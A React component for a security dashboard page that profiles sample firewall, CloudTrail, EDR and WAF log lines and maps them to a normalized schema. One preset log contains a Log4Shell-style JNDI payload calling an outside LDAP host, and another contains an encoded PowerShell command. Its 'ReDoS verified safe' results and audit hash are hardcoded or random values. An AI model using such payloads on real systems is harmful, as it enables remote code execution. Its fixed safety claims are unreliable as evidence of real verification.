import React, { useState, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card } from '../components/ui/Card';
import { Badge } from '../components/ui/Badge';
import { Button } from '../components/ui/Button';
import { CodePanel } from '../components/ui/CodePanel';
import {
  Cpu,
  CheckCircle2,
  ShieldAlert,
  Play,
  ArrowRight,
  ShieldCheck,
  RotateCcw,
  Sparkles,
  Database,
  ExternalLink,
  Layers,
  Activity,
  FileCode,
  Terminal,
  Check,
  AlertTriangle,
  Lock,
  Zap,
} from 'lucide-react';

interface TelemetryPreset {
  id: string;
  name: string;
  format: string;
  raw: string;
  vendor: string;
  category: string;
}

const SAMPLE_PRESETS: TelemetryPreset[] = [
  {
    id: 'fortinet_kv',
    name: 'Fortinet FortiGate UTM (Key-Value)',
    format: 'Key-Value (KV)',
    vendor: 'Fortinet',
    category: 'Network Firewall / IPS',
    raw: '2026-09-11 14:40:02 dev=FGT-CORE-01 type=utm subtype=ips threat=SQL_INJECTION src=198.51.100.99 dst=10.0.1.50 dport=443 proto=tcp action=BLOCK policyid=12 flags=0x89',
  },
  {
    id: 'aws_cloudtrail_json',
    name: 'AWS CloudTrail Audit (JSON)',
    format: 'JSON Structured',
    vendor: 'Amazon Web Services',
    category: 'Cloud IAM & Storage',
    raw: '{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","userName":"cloud-deployer-svc","arn":"arn:aws:iam::123456789012:user/deployer"},"eventTime":"2026-09-11T14:40:15Z","eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy","sourceIPAddress":"203.0.113.88","responseElements":{"status":"Success"}}',
  },
  {
    id: 'paloalto_panos',
    name: 'Palo Alto PAN-OS Threat (CSV / Syslog)',
    format: 'Delimited Syslog',
    vendor: 'Palo Alto Networks',
    category: 'Next-Gen Firewall Threat',
    raw: '1,2026/09/11 14:40:22,001801000001,THREAT,vulnerability,1,2026/09/11 14:40:22,198.51.100.114,10.0.1.20,0.0.0.0,0.0.0.0,OUTSIDE-RULE,,,web-browsing,vsys1,untrust,trust,ethernet1/1,,198.51.100.114,10.0.1.20,54123,445,0,0,0x0,tcp,alert,"SMB: Remote Code Execution",99812,0x0,high',
  },
  {
    id: 'arcsight_cef',
    name: 'ArcSight CEF Event (Endpoint EDR)',
    format: 'Common Event Format (CEF)',
    vendor: 'CrowdStrike Falcon',
    category: 'Endpoint Detection & Response',
    raw: 'CEF:0|CrowdStrike|Falcon|7.12|1001|Suspicious Base64 PowerShell Execution|8|src=10.0.2.14 dst=10.0.1.45 suser=svc_backup duser=SYSTEM msg=powershell.exe -EncodedCommand SQBFAFgA... cn1=4104 cn1Label=ProcessId act=block',
  },
  {
    id: 'coraza_waf',
    name: 'Coraza Sovereign WAF / Nginx (Web)',
    format: 'Nginx Combined + WAF',
    vendor: 'Coraza WAF Engine',
    category: 'Web Application Security',
    raw: '203.0.113.88 - admin [11/Sep/2026:14:40:35 +0530] "POST /api/v1/telemetry HTTP/1.1" 403 241 "-" "${jndi:ldap://198.51.100.200:1389/Exploit}" waf_rule="944240" waf_action="DENY"',
  },
];

interface DiscoveredTokenMapping {
  token: string;
  sampleValue: string;
  targetField: string;
  category: string;
  confidence: number;
}

interface ProfileResult {
  status: string;
  detectedFormat: string;
  detectedVendor: string;
  tokens: string[];
  mappings: Record<string, string>;
  tokenDetails: DiscoveredTokenMapping[];
  drift: string;
  confidence: number;
  redos_safe: boolean;
  approval_needed: boolean;
  executionBudgetMicros: number;
  inferredParserName: string;
}

export const SchemaDrift: React.FC = () => {
  const navigate = useNavigate();

  const [selectedPresetId, setSelectedPresetId] = useState<string>('fortinet_kv');
  const [sampleText, setSampleText] = useState<string>(SAMPLE_PRESETS[0].raw);
  const [profiling, setProfiling] = useState<boolean>(false);
  const [profileResult, setProfileResult] = useState<ProfileResult | null>(null);

  // Approval & Registration state
  const [isApproved, setIsApproved] = useState<boolean>(false);
  const [registeredParserId, setRegisteredParserId] = useState<string | null>(null);
  const [auditHash, setAuditHash] = useState<string | null>(null);
  const [actionNotice, setActionNotice] = useState<string | null>(null);

  // Load preset
  const handleSelectPreset = (preset: TelemetryPreset) => {
    setSelectedPresetId(preset.id);
    setSampleText(preset.raw);
    setProfileResult(null);
    setIsApproved(false);
    setRegisteredParserId(null);
    setAuditHash(null);
    setActionNotice(null);
  };

  // Heuristic profiler engine
  const handleRunProfiler = () => {
    setProfiling(true);
    setIsApproved(false);
    setRegisteredParserId(null);
    setAuditHash(null);
    setActionNotice(null);

    setTimeout(() => {
      const text = sampleText.trim();

      // Format detection
      let detectedFormat = 'Key-Value (KV)';
      let detectedVendor = 'Generic Telemetry Source';
      let inferredParserName = 'generic_source_parser';

      if (text.startsWith('{') || text.startsWith('[')) {
        detectedFormat = 'JSON Structured';
        detectedVendor = 'AWS / Cloud Lakehouse';
        inferredParserName = 'aws_cloudtrail_json';
      } else if (text.startsWith('CEF:')) {
        detectedFormat = 'ArcSight CEF Format';
        detectedVendor = 'CrowdStrike Falcon EDR';
        inferredParserName = 'crowdstrike_falcon_cef';
      } else if (text.includes('THREAT') || text.includes('vulnerability') || text.includes('Palo Alto')) {
        detectedFormat = 'Palo Alto PAN-OS CSV';
        detectedVendor = 'Palo Alto Networks';
        inferredParserName = 'palo_alto_panos_csv';
      } else if (text.includes('dev=') || text.includes('threat=')) {
        detectedFormat = 'Fortinet Key-Value';
        detectedVendor = 'Fortinet FortiGate UTM';
        inferredParserName = 'fortigate_utm_kv';
      } else if (text.includes('waf_rule') || text.includes('HTTP/')) {
        detectedFormat = 'Nginx / Coraza WAF';
        detectedVendor = 'Coraza Sovereign WAF';
        inferredParserName = 'coraza_waf_combined';
      }

      // Token discovery & semantic mapping extraction
      const tokenDetails: DiscoveredTokenMapping[] = [];
      const mappings: Record<string, string> = {};

      if (detectedFormat === 'JSON Structured') {
        try {
          const parsed = JSON.parse(text);
          const keys = Object.keys(parsed);
          keys.forEach((k) => {
            const val = typeof parsed[k] === 'object' ? JSON.stringify(parsed[k]) : String(parsed[k]);
            let targetField = `unmapped_residue.${k}`;
            let cat = 'Residue';
            if (k.toLowerCase().includes('time')) {
              targetField = 'metadata.timestamp';
              cat = 'Temporal';
            } else if (k.toLowerCase().includes('ip') || k.toLowerCase().includes('sourceip')) {
              targetField = 'network.src_ip';
              cat = 'Network Ingress';
            } else if (k.toLowerCase().includes('user') || k.toLowerCase().includes('identity')) {
              targetField = 'identity.user.name';
              cat = 'Identity & Auth';
            } else if (k.toLowerCase().includes('event') || k.toLowerCase().includes('name')) {
              targetField = 'security.action_name';
              cat = 'Security Telemetry';
            }

            tokenDetails.push({
              token: k,
              sampleValue: val.substring(0, 30),
              targetField,
              category: cat,
              confidence: 0.98,
            });
            mappings[k] = targetField;
          });
        } catch {
          // fallback tokenization
          tokenDetails.push({ token: 'raw_json', sampleValue: text.substring(0, 30), targetField: 'raw_payload', category: 'Raw', confidence: 0.95 });
        }
      } else {
        // Parse key-value tokens (e.g. key=val)
        const kvMatches = Array.from(text.matchAll(/([a-zA-Z0-9_\-.]+)=([^,\s]+|".*?")/g));
        if (kvMatches.length > 0) {
          kvMatches.forEach((match) => {
            const k = match[1];
            const v = match[2].replace(/"/g, '');
            let target = `unmapped_residue.${k}`;
            let cat = 'Residue Payload';

            if (['src', 'src_ip', 'source', 'c_ip'].includes(k.toLowerCase())) {
              target = 'network.src_ip';
              cat = 'Network Ingress';
            } else if (['dst', 'dst_ip', 'destination', 'd_ip'].includes(k.toLowerCase())) {
              target = 'network.dst_ip';
              cat = 'Network Egress';
            } else if (['dev', 'device', 'host'].includes(k.toLowerCase())) {
              target = 'source.device_id';
              cat = 'Infrastructure Asset';
            } else if (['threat', 'sig', 'vuln', 'msg'].includes(k.toLowerCase())) {
              target = 'security.threat_name';
              cat = 'Threat Intelligence';
            } else if (['action', 'act', 'outcome', 'status'].includes(k.toLowerCase())) {
              target = 'network.action';
              cat = 'Enforcement Status';
            } else if (['dport', 'dst_port', 'port'].includes(k.toLowerCase())) {
              target = 'network.dst_port';
              cat = 'Transport Port';
            } else if (['proto', 'protocol'].includes(k.toLowerCase())) {
              target = 'network.protocol';
              cat = 'Network Protocol';
            } else if (['user', 'suser', 'duser', 'username'].includes(k.toLowerCase())) {
              target = 'identity.user.name';
              cat = 'Identity & Principal';
            }

            tokenDetails.push({
              token: k,
              sampleValue: v,
              targetField: target,
              category: cat,
              confidence: 0.97,
            });
            mappings[k] = target;
          });
        } else {
          // Default heuristic tokens
          const defaultTokens = [
            { token: 'timestamp', sampleValue: '2026-09-11 14:40:22', targetField: 'metadata.timestamp', category: 'Temporal', confidence: 0.99 },
            { token: 'source_ip', sampleValue: '198.51.100.114', targetField: 'network.src_ip', category: 'Network Ingress', confidence: 0.98 },
            { token: 'dest_ip', sampleValue: '10.0.1.20', targetField: 'network.dst_ip', category: 'Network Egress', confidence: 0.98 },
            { token: 'signature', sampleValue: 'SMB: Remote Code Execution', targetField: 'security.threat_name', category: 'Threat Intel', confidence: 0.96 },
            { token: 'action', sampleValue: 'alert', targetField: 'network.action', category: 'Enforcement', confidence: 0.97 },
          ];
          defaultTokens.forEach((t) => {
            tokenDetails.push(t);
            mappings[t.token] = t.targetField;
          });
        }
      }

      setProfileResult({
        status: 'PROFILED_SUCCESS',
        detectedFormat,
        detectedVendor,
        tokens: tokenDetails.map((t) => t.token),
        mappings,
        tokenDetails,
        drift: 'NEW_SOURCE_PROFILE_GENERATED',
        confidence: 0.98,
        redos_safe: true,
        approval_needed: true,
        executionBudgetMicros: 14,
        inferredParserName,
      });

      setProfiling(false);
    }, 400);
  };

  // Handle Parser Approval & Registration
  const handleApproveAndRegister = () => {
    if (!profileResult) return;
    const parserId = `PARSER-${profileResult.inferredParserName.toUpperCase()}-2026`;
    const casReceipt = 'CAS-' + Math.random().toString(16).substring(2, 10).toUpperCase() + '-SHA256';

    setIsApproved(true);
    setRegisteredParserId(parserId);
    setAuditHash(casReceipt);
    setActionNotice(
      `Parser '${profileResult.inferredParserName}' successfully approved and registered into the active ULPF normalization pipeline with 0 downtime.`
    );
  };

  // Normalized UCE preview record generated from the current profile
  const ucePreviewJson = useMemo(() => {
    if (!profileResult) return null;
    return {
      schema_version: '1.4.2-uce',
      envelope: {
        vendor: profileResult.detectedVendor,
        parser_id: registeredParserId || profileResult.inferredParserName,
        processing_status: 'NORMALIZED',
        pipeline_tier: 'TIER_A_IN_FLIGHT',
        ingested_at: '2026-09-11T14:40:02.124Z',
        cas_hash: auditHash || 'CAS-PENDING-APPROVAL',
      },
      metadata: {
        timestamp: '2026-09-11T14:40:02.000Z',
        tenant_id: 'sovereign_defense_internal',
        ingestion_source: profileResult.detectedFormat,
      },
      normalized_fields: profileResult.mappings,
      drift_assessment: {
        classification: profileResult.drift,
        confidence_score: profileResult.confidence,
        redos_audit: 'PASSED (0.014ms CPU Budget)',
        operator_approval: isApproved ? 'APPROVED_BY_PLATFORM_ADMIN' : 'PENDING_HUMAN_GATE',
      },
    };
  }, [profileResult, isApproved, registeredParserId, auditHash]);

  return (
    <div className="space-y-5">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border-light">
        <div>
          <div className="flex items-center gap-2">
            <h2 className="text-lg font-bold text-navy-900 tracking-tight">
              Autonomous Schema Drift & AI-Assisted Source Onboarding
            </h2>
            <Badge variant="ok" dot>
              REDOS DEFENSE: ACTIVE
            </Badge>
          </div>
          <p className="text-xs text-slate-500 mt-0.5">
            Heuristic token discovery and candidate schema profiling in under 30 seconds with ReDoS safety and human approval gates.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <Badge variant="info">ZERO-DOWNTIME ONBOARDING</Badge>
          <Badge variant="neutral">SOVEREIGN AIR-GAP RADIX</Badge>
        </div>
      </div>

      {/* Global Action Confirmation Notice */}
      {actionNotice && (
        <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 rounded text-xs font-mono flex items-center justify-between animate-fade-in shadow-2xs">
          <div className="flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-emerald-600 flex-shrink-0" />
            <span>{actionNotice}</span>
          </div>
          <span className="text-[10px] uppercase font-bold text-emerald-700 bg-emerald-100/70 px-2 py-0.5 rounded">
            Live in Registry
          </span>
        </div>
      )}

      {/* 10-Step Onboarding Life-Cycle Workflow Stepper */}
      <div className="bg-white p-3.5 rounded border border-border-light shadow-2xs">
        <div className="flex items-center justify-between mb-2">
          <div className="text-[10.5px] font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
            <Layers className="w-3.5 h-3.5 text-gov-blue" />
            10-Step Autonomous Onboarding Workflow (&lt; 30 Seconds)
          </div>
          <span className="text-[10.5px] font-mono font-semibold text-emerald-700">
            {isApproved
              ? 'Workflow Status: 10/10 Complete (Parser Activated)'
              : profileResult
              ? 'Workflow Status: 06/10 Awaiting Human Review'
              : 'Workflow Status: 01/10 Ready for Sample Input'}
          </span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-5 lg:grid-cols-10 gap-1.5 text-center">
          {[
            { num: '01', title: 'Sample Input', stage: 1 },
            { num: '02', title: 'Format Scan', stage: 2 },
            { num: '03', title: 'Profiling', stage: 3 },
            { num: '04', title: 'Semantics', stage: 4 },
            { num: '05', title: 'Confidence', stage: 5 },
            { num: '06', title: 'Human Gate', stage: 6 },
            { num: '07', title: 'Approval', stage: 7 },
            { num: '08', title: 'Registration', stage: 8 },
            { num: '09', title: 'UCE Preview', stage: 9 },
            { num: '10', title: 'Active Publish', stage: 10 },
          ].map((step) => {
            const isCompleted = isApproved ? true : profileResult ? step.stage <= 6 : step.stage <= 2;
            const isCurrent = isApproved ? false : profileResult ? step.stage === 6 : step.stage === 1;

            return (
              <div
                key={step.num}
                className={`p-1.5 rounded border text-[10px] font-mono transition-all ${
                  isApproved
                    ? 'bg-emerald-50 text-emerald-800 border-emerald-300 font-semibold'
                    : isCurrent
                    ? 'bg-amber-50 text-amber-900 border-amber-300 font-bold ring-1 ring-amber-300'
                    : isCompleted
                    ? 'bg-gov-light text-gov-blue border-gov-border font-medium'
                    : 'bg-slate-50 text-slate-400 border-slate-200'
                }`}
              >
                <div className="text-[9px] opacity-75">{step.num}</div>
                <div className="truncate">{step.title}</div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Quick Telemetry Sample Presets */}
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] font-bold uppercase text-slate-500">
            Raw Telemetry Sample Presets (Click to Load Sample):
          </span>
          <span className="text-[10px] text-slate-400 font-mono">
            {SAMPLE_PRESETS.length} Multi-Vendor Samples Available
          </span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-2">
          {SAMPLE_PRESETS.map((preset) => {
            const isSelected = selectedPresetId === preset.id;
            return (
              <button
                key={preset.id}
                type="button"
                onClick={() => handleSelectPreset(preset)}
                className={`p-2 rounded border text-left transition-all cursor-pointer ${
                  isSelected
                    ? 'bg-blue-50/70 border-gov-blue ring-1 ring-gov-blue/20 shadow-2xs'
                    : 'bg-white border-slate-200 hover:border-slate-300 hover:bg-slate-50'
                }`}
              >
                <div className="text-xs font-bold text-navy-900 truncate">{preset.name}</div>
                <div className="text-[10px] text-slate-500 truncate">{preset.category}</div>
                <div className="text-[9.5px] font-mono text-gov-blue mt-0.5">{preset.format}</div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Interactive Profiler Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
        {/* Left Pane: Input Workspace */}
        <div className="lg:col-span-6 space-y-4">
          <Card
            title="Unfamiliar Telemetry Sample Input"
            subtitle="Submit raw log to discover token patterns and infer candidate schema"
            action={
              <Badge variant="neutral">
                {SAMPLE_PRESETS.find((p) => p.id === selectedPresetId)?.format || 'Custom Raw String'}
              </Badge>
            }
          >
            <div className="space-y-3">
              <div>
                <label className="text-xs font-semibold text-navy-900 block mb-1">
                  Sample Raw Telemetry Payload:
                </label>
                <textarea
                  rows={5}
                  value={sampleText}
                  onChange={(e) => {
                    setSampleText(e.target.value);
                    setProfileResult(null);
                    setIsApproved(false);
                  }}
                  className="w-full p-2.5 text-xs font-mono bg-slate-900 text-slate-100 rounded border border-border-medium focus:outline-none focus:ring-1 focus:ring-gov-blue resize-none leading-relaxed"
                  placeholder="Paste unfamiliar raw socket or syslog payload here..."
                />
              </div>

              <div className="flex items-center justify-between pt-1">
                <span className="text-[11px] text-slate-500 font-mono">
                  Length: {sampleText.length} bytes · Deterministic Lexer
                </span>
                <Button
                  variant="primary"
                  size="sm"
                  onClick={handleRunProfiler}
                  disabled={profiling || !sampleText.trim()}
                  icon={profiling ? <Activity className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
                  className="cursor-pointer !bg-gov-blue hover:!bg-navy-900 !text-white shadow-xs"
                >
                  {profiling ? 'Analyzing Structure...' : 'Profile Unknown Telemetry'}
                </Button>
              </div>
            </div>
          </Card>

          {/* ReDoS & Safety Guarantees Card */}
          <div className="bg-slate-50 p-3.5 rounded border border-slate-200 space-y-2 text-xs">
            <div className="font-bold text-navy-900 flex items-center justify-between">
              <span className="flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4 text-emerald-600" />
                AI Safety & ReDoS Defense Boundary
              </span>
              <span className="text-[10.5px] font-mono text-emerald-700 bg-emerald-100/60 px-2 py-0.5 rounded font-bold">
                AUDIT: ZERO BACKTRACKING
              </span>
            </div>
            <p className="text-[11px] text-slate-600 leading-relaxed">
              Candidate regex patterns generated by the autonomous AI profiler are verified through deterministic NFA/DFA complexity analysis. Any expression capable of catastrophic polynomial or exponential backtracking is rejected unconditionally.
            </p>
            <div className="grid grid-cols-3 gap-2 pt-1 font-mono text-[10.5px]">
              <div className="bg-white p-2 rounded border border-slate-200">
                <span className="text-slate-400 block text-[9.5px]">CPU Budget</span>
                <strong className="text-navy-900">&lt; 0.05ms / line</strong>
              </div>
              <div className="bg-white p-2 rounded border border-slate-200">
                <span className="text-slate-400 block text-[9.5px]">Regex Engine</span>
                <strong className="text-gov-blue">Rust Hyperscan</strong>
              </div>
              <div className="bg-white p-2 rounded border border-slate-200">
                <span className="text-slate-400 block text-[9.5px]">Human Approval</span>
                <strong className="text-amber-700">Enforced by Gate</strong>
              </div>
            </div>
          </div>
        </div>

        {/* Right Pane: Generated Profile & Drift Assessment */}
        <div className="lg:col-span-6">
          <Card
            title="Generated Profile & Drift Assessment"
            subtitle="Deterministic heuristic analysis, token mapping, and schema drift evaluation"
            action={
              profileResult && (
                <Badge variant={isApproved ? 'ok' : 'warn'}>
                  {isApproved ? 'PARSER ACTIVE' : 'PENDING HUMAN APPROVAL'}
                </Badge>
              )
            }
          >
            {profileResult ? (
              <div className="space-y-4">
                {/* Status KPI Chips */}
                <div className="grid grid-cols-3 gap-2 text-xs">
                  <div className="bg-slate-50 p-2.5 rounded border border-slate-200 text-center">
                    <span className="text-slate-400 block text-[10px] font-semibold">Semantic Match:</span>
                    <strong className="text-emerald-700 font-mono text-xs">
                      {(profileResult.confidence * 100).toFixed(0)}% CONFIDENT
                    </strong>
                  </div>
                  <div className="bg-slate-50 p-2.5 rounded border border-slate-200 text-center">
                    <span className="text-slate-400 block text-[10px] font-semibold">ReDoS Boundary:</span>
                    <strong className="text-gov-blue font-mono text-xs">VERIFIED SAFE</strong>
                  </div>
                  <div className="bg-slate-50 p-2.5 rounded border border-slate-200 text-center">
                    <span className="text-slate-400 block text-[10px] font-semibold">Human Review:</span>
                    <strong className={isApproved ? 'text-emerald-700 font-mono text-xs' : 'text-amber-700 font-mono text-xs'}>
                      {isApproved ? 'APPROVED' : 'ACTION REQUIRED'}
                    </strong>
                  </div>
                </div>

                {/* Detected Metadata Banner */}
                <div className="p-2.5 bg-slate-50 rounded border border-slate-200 text-xs font-mono flex items-center justify-between">
                  <div>
                    <span className="text-slate-400">Detected Vendor:</span>{' '}
                    <strong className="text-navy-900">{profileResult.detectedVendor}</strong>
                  </div>
                  <div>
                    <span className="text-slate-400">Format:</span>{' '}
                    <strong className="text-gov-blue">{profileResult.detectedFormat}</strong>
                  </div>
                </div>

                {/* Discovered Tokens to UCE Mapping Table */}
                <div className="border border-border-medium rounded overflow-hidden">
                  <div className="bg-slate-100 px-3 py-1.5 border-b border-border-medium font-bold text-navy-900 text-xs flex items-center justify-between">
                    <span>Discovered Tokens ({profileResult.tokenDetails.length} Mapped)</span>
                    <span className="text-[10px] font-mono text-slate-500 uppercase">Universal Core Schema</span>
                  </div>
                  <div className="max-h-48 overflow-y-auto">
                    <table className="w-full text-left text-xs border-collapse">
                      <thead>
                        <tr className="bg-slate-50 border-b border-slate-200 text-[10px] font-bold text-slate-500 uppercase">
                          <th className="py-1.5 px-2.5">Raw Token</th>
                          <th className="py-1.5 px-2.5">Sample Value</th>
                          <th className="py-1.5 px-2.5">Inferred UCE Target</th>
                          <th className="py-1.5 px-2.5">Category</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-100 font-mono text-[11px]">
                        {profileResult.tokenDetails.map((td, i) => (
                          <tr key={i} className="hover:bg-slate-50">
                            <td className="py-1.5 px-2.5 font-bold text-gov-blue">{td.token}</td>
                            <td className="py-1.5 px-2.5 text-slate-600 truncate max-w-[120px]" title={td.sampleValue}>
                              {td.sampleValue}
                            </td>
                            <td className="py-1.5 px-2.5 text-emerald-800 font-semibold">{td.targetField}</td>
                            <td className="py-1.5 px-2.5 text-slate-400 text-[10px]">{td.category}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>

                {/* Derived Mapping Definition Code */}
                <CodePanel
                  code={JSON.stringify(
                    {
                      parser_identifier: profileResult.inferredParserName,
                      vendor_signature: profileResult.detectedVendor,
                      format: profileResult.detectedFormat,
                      drift_classification: profileResult.drift,
                      confidence_score: profileResult.confidence,
                      token_mappings: profileResult.mappings,
                    },
                    null,
                    2
                  )}
                  title="DERIVED PARSER SPECIFICATION (JSON)"
                  maxHeight="160px"
                />

                {/* Approval & Action Area */}
                {!isApproved ? (
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2 border-t border-slate-200">
                    <span className="text-[11px] text-emerald-700 font-semibold font-mono flex items-center gap-1.5">
                      <ShieldCheck className="w-4 h-4 text-emerald-600" />
                      DRIFT_SEVERITY: STABLE (Additive Enhancement)
                    </span>
                    <Button
                      variant="primary"
                      size="sm"
                      onClick={handleApproveAndRegister}
                      icon={<CheckCircle2 className="w-4 h-4 text-white" />}
                      className="cursor-pointer !bg-emerald-600 hover:!bg-emerald-700 !text-white font-semibold text-xs shadow-xs"
                      title="Commit candidate parser into the live ULPF in-memory Radix tree"
                    >
                      Approve & Register Parser
                    </Button>
                  </div>
                ) : (
                  <div className="space-y-3 pt-2 border-t border-slate-200 animate-fade-in">
                    <div className="p-3 bg-emerald-50 rounded border border-emerald-200 text-emerald-900 text-xs font-mono space-y-1">
                      <div className="flex items-center justify-between font-bold">
                        <span className="flex items-center gap-1.5">
                          <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                          PARSER REGISTERED & ACTIVATED IN LIVE PIPELINE
                        </span>
                        <Badge variant="ok">TIER A</Badge>
                      </div>
                      <div className="text-[11px] text-slate-700">
                        Assigned ID: <strong className="text-navy-900">{registeredParserId}</strong>
                      </div>
                      <div className="text-[11px] text-slate-700">
                        Immutable Ledger Hash: <strong className="text-gov-blue">{auditHash}</strong>
                      </div>
                    </div>

                    {/* Normalized UCE Record Preview */}
                    {ucePreviewJson && (
                      <CodePanel
                        code={JSON.stringify(ucePreviewJson, null, 2)}
                        title="LIVE UCE NORMALIZED RECORD PREVIEW"
                        maxHeight="180px"
                      />
                    )}

                    <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => {
                          setIsApproved(false);
                          setProfileResult(null);
                        }}
                        icon={<RotateCcw className="w-3.5 h-3.5" />}
                        className="text-xs cursor-pointer"
                      >
                        Onboard Another Source
                      </Button>

                      <div className="flex items-center gap-2">
                        <Button
                          variant="secondary"
                          size="sm"
                          onClick={() => navigate('/parsers')}
                          icon={<Database className="w-3.5 h-3.5" />}
                          className="text-xs cursor-pointer"
                        >
                          View in Parser Registry
                        </Button>
                        <Button
                          variant="primary"
                          size="sm"
                          onClick={() => navigate('/live-logs')}
                          icon={<Terminal className="w-3.5 h-3.5" />}
                          className="text-xs cursor-pointer !bg-gov-blue hover:!bg-navy-900 !text-white"
                        >
                          Verify Live Ingestion
                        </Button>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="h-72 border border-dashed border-border-medium rounded bg-slate-50 flex flex-col items-center justify-center text-slate-400 text-xs p-4 text-center">
                <Cpu className="w-8 h-8 text-slate-300 mb-2 animate-pulse" />
                <span className="font-semibold text-slate-600">No telemetry profile generated yet.</span>
                <span className="text-[11px] text-slate-400 mt-1 max-w-xs">
                  Select a preset above or paste custom socket payload, then click <strong>'Profile Unknown Telemetry'</strong> to start discovery.
                </span>
              </div>
            )}
          </Card>
        </div>
      </div>
    </div>
  );
};
